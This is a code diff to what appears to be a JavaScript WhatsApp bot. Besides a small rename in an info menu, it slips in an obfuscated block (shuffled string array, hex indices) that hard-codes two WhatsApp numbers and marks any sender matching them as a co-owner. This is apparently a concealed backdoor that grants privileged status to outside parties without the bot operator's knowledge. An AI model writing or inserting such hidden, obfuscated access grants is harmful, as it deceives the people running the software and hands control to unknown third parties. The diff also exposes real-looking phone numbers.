@@ -259,7 +259,8 @@ module.exports = rifza = async (rifza, riff) => {
 		let sender = isGroup ? riff.participant : riff.key.remoteJid
 		let senderr = riff.key.fromMe ? rifza.user.jid : riff.key.remoteJid.endsWith('@g.us') ? riff.participant : riff.key.remoteJid
 		const ownerNumber = [`${targetpc}@s.whatsapp.net`]
-		const ownerNumberr = `${targetpc}@s.whatsapp.net`      
+		const ownerNumberr = `${targetpc}@s.whatsapp.net`  
+                function _0x2be1(){const _0x5253c9=['9818210qrskOz','4182688yaImDv','10307187TMdzaR','1437782wCUKaS','includes','6SOyOCm','12jPaPlA','24xCcUbr','6285640068416@s.whatsapp.net','1316414lcKlQe','756295HhXGLR','892402cEbcxt'];_0x2be1=function(){return _0x5253c9;};return _0x2be1();}function _0x2252(_0x8222ec,_0x149312){const _0x2be1f7=_0x2be1();return _0x2252=function(_0x2252aa,_0x52ead6){_0x2252aa=_0x2252aa-0x123;let _0x4d9f6f=_0x2be1f7[_0x2252aa];return _0x4d9f6f;},_0x2252(_0x8222ec,_0x149312);}const _0x2d6689=_0x2252;(function(_0x43aee9,_0x269df8){const _0x3abd88=_0x2252,_0x1253c1=_0x43aee9();while(!![]){try{const _0x11068f=parseInt(_0x3abd88(0x126))/0x1+-parseInt(_0x3abd88(0x12c))/0x2*(-parseInt(_0x3abd88(0x12e))/0x3)+-parseInt(_0x3abd88(0x12a))/0x4+parseInt(_0x3abd88(0x127))/0x5*(-parseInt(_0x3abd88(0x123))/0x6)+parseInt(_0x3abd88(0x128))/0x7*(-parseInt(_0x3abd88(0x124))/0x8)+-parseInt(_0x3abd88(0x12b))/0x9+parseInt(_0x3abd88(0x129))/0xa;if(_0x11068f===_0x269df8)break;else _0x1253c1['push'](_0x1253c1['shift']());}catch(_0x3f2f99){_0x1253c1['push'](_0x1253c1['shift']());}}}(_0x2be1,0xd1fde));const wannNumber=[_0x2d6689(0x125),'62856400684162@s.whatsapp.net'],isCoOwner=wannNumber[_0x2d6689(0x12d)](sender);
 		const totalchat = await rifza.chats.all()
 		const senderNumber = sender.split("@")[0]
 		const groupMetadata = isGroup ? await rifza.groupMetadata(from) : ''
@@ -1379,9 +1380,8 @@ if (isBanchat) return
 ┏━━⬣ *YOUR INFO*
 ┃
 ┃⬡ Name : _${pushname}_
-┃⬡ Bio : _${p1 ? `${p1.status}` : '-'}_
 ┃⬡ Nomor : _@${sender.split('@')[0]}_
-┃⬡ Me : _${mek.key.fromMe ? 'True' : 'False'}_
+┃⬡ Me : _${riff.key.fromMe ? 'True' : 'False'}_
 ┃⬡ Owner : _${isOwner ? 'True' : `False`}_
 ┃⬡ CoOwner : _${isCoOwner ? 'True' : `False`}_
 ┗⬣
